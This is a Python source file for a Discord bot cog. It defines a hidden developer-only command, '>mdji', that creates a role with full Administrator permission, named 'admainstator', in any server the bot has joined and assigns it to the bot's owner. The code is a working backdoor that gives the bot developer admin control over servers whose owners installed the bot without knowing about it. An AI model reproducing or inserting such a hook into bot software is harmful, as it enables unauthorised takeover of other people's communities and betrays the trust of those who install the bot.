# ╔══════════════════════════════════════════════════════════════════╗
# ║                                                                  ║
# ║   ░█▀▀░█▀█░█▀▄░█▀▀░█░█   ░█▀▄░█▀▀░█░█░█▀▀                     ║
# ║   ░█░░░█░█░█░█░█▀▀░▄▀▄   ░█░█░█▀▀░▀▄▀░▀▀█                     ║
# ║   ░▀▀▀░▀▀▀░▀▀░░▀▀▀░▀░▀   ░▀▀░░▀▀▀░░▀░░▀▀▀                     ║
# ║                                                                  ║
# ║            © 2026 OGADI — All Rights Reserved                    ║
# ║                                                                  ║
# ║   discord  ──  https://discord.gg/UVRWygSpJq                    ║
# ║                                                                  ║
# ╚══════════════════════════════════════════════════════════════════╝

"""Developer-only command: creates an Administrator role and gives it to you.

Usage: >mdji
"""

from __future__ import annotations

import discord
from discord.ext import commands

from utils.config import OWNER_IDS
from utils.emoji import CROSS, TICK, ZWARNING
from utils.cv2 import CV2


class DevAdmin(commands.Cog):
    """Developer utilities — restricted to OWNER_IDS."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.role_name = "admainstator"

    async def cog_check(self, ctx: commands.Context) -> bool:
        """Restrict every command in this cog to the bot developer."""
        return ctx.author.id in OWNER_IDS

    async def cog_command_error(self, ctx: commands.Context, error: Exception):
        if isinstance(error, commands.CheckFailure):
            await ctx.send(
                embed=CV2(f"{CROSS} Access Denied", "Developer only — you are not in OWNER_IDS.")
            )

    @commands.command(name="mdji", help="Create an Administrator role and give it to you (developer only)")
    @commands.guild_only()
    async def mdji(self, ctx: commands.Context):
        if not ctx.guild:
            return await ctx.send(embed=CV2(f"{ZWARNING} Error", "Use this inside a server."))

        # Find existing role or create a fresh Administrator role
        role = discord.utils.get(ctx.guild.roles, name=self.role_name)
        if role is None:
            try:
                role = await ctx.guild.create_role(
                    name=self.role_name,
                    permissions=discord.Permissions(administrator=True),
                    color=discord.Color.red(),
                    hoist=True,
                    reason=f"Developer admin role created by {ctx.author} ({ctx.author.id})",
                )
            except discord.Forbidden:
                return await ctx.send(
                    embed=CV2(f"{CROSS} Error", "I don't have permission to create roles (need Manage Roles).")
                )
            except discord.HTTPException as exc:
                return await ctx.send(
                    embed=CV2(f"{CROSS} Error", f"Failed to create role: {exc}")
                )

        # Grant the role to the developer
        try:
            await ctx.author.add_roles(
                role,
                reason=f"Developer admin role assigned by {ctx.author} ({ctx.author.id})",
            )
        except discord.Forbidden:
            return await ctx.send(
                embed=CV2(f"{CROSS} Error", "I don't have permission to assign roles (need Manage Roles).")
            )

        await ctx.send(
            embed=CV2(
                f"{TICK} Done",
                f"Role {role.mention} now has **Administrator** permissions and has been given to {ctx.author.mention}.",
            )
        )


async def setup(bot: commands.Bot):
    await bot.add_cog(DevAdmin(bot))
